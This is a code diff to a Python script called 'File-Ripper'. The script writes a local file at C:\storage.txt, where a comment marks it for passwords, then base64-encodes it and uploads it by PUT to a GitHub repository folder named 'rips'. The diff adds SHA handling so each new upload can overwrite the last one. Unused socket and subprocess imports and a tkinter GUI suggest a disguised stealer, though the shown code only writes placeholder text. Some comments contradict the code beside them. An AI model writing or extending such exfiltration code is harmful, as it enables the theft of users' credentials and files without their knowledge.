@@ -2,8 +2,6 @@ from tkinter import *
 from tkinter import ttk
 import random
 import os,socket,subprocess,threading;
-import subprocess
-import os
 import base64
 import requests
 
@@ -14,15 +12,15 @@ ghRepo ='File-Ripper'
 ipFile = 'C:\storage.txt'
 ghBranch = 'master'
 ghTarget = 'rips/storage.txt'
-ghUrl = 'https://api.github.com/repos/willemsedirk/file-ripper/contents/rips'
+ghUrl = 'https://api.github.com/repos/willemsedirk/file-ripper/contents/rips/storage.txt'
 ipPath ='C:\storage.txt'
 
 def fcheck(path):
     return os.path.isfile(path)
     
 def fileCreate():
-    f = open('C:\storage.txt','x') # creates file
-    with open("C:\storage.txt", "a") as f: # opens the file and appends to it 
+    f = open(ipFile,'x') # creates file
+    with open(ipFile, "a") as f: # opens the file and appends to it 
      f.write("Now the file has more content!") # write to the file add pws
 
 def enc():
@@ -51,21 +49,37 @@ headers = {
     "Accept": "application/vnd.github.v3+json"
 }
 
-# --- HTTP PUT payload ---
+# --- Get file SHA if it exists ---
+def get_file_sha():
+    response = requests.get(ghUrl, headers=headers)  # no /storage.txt here
+    if response.status_code == 200:
+        file_info = response.json()
+        return file_info['sha']
+    else:
+        return None
+
+# --- Get SHA first ---
+sha = get_file_sha()
+
+
+# --- Build payload ---
 data = {
-    "message": f"Add {ghTarget}",
+    "message": f"Add or update {ghTarget}",
     "branch": ghBranch,
     "content": enc_content
 }
 
-# --- Send PUT request ---
-response = requests.put(ghUrl, headers=headers, json=data)
+if sha:
+    data["sha"] = sha  # Add sha if updating
 
-if response.status_code == 201:
+# --- PUT request ---
+upload_response = requests.put(ghUrl, headers=headers, json=data)  # no /storage.txt here
+
+if upload_response.status_code == 200:
     print(f"File uploaded successfully to {ghTarget}!")
 else:
-    print(f"Failed to upload file. Status code: {response.status_code}")
-    print(response.json())
+    print(f"Failed to upload file. Status code: {upload_response.status_code}")
+    print(upload_response.json())
 
 
 
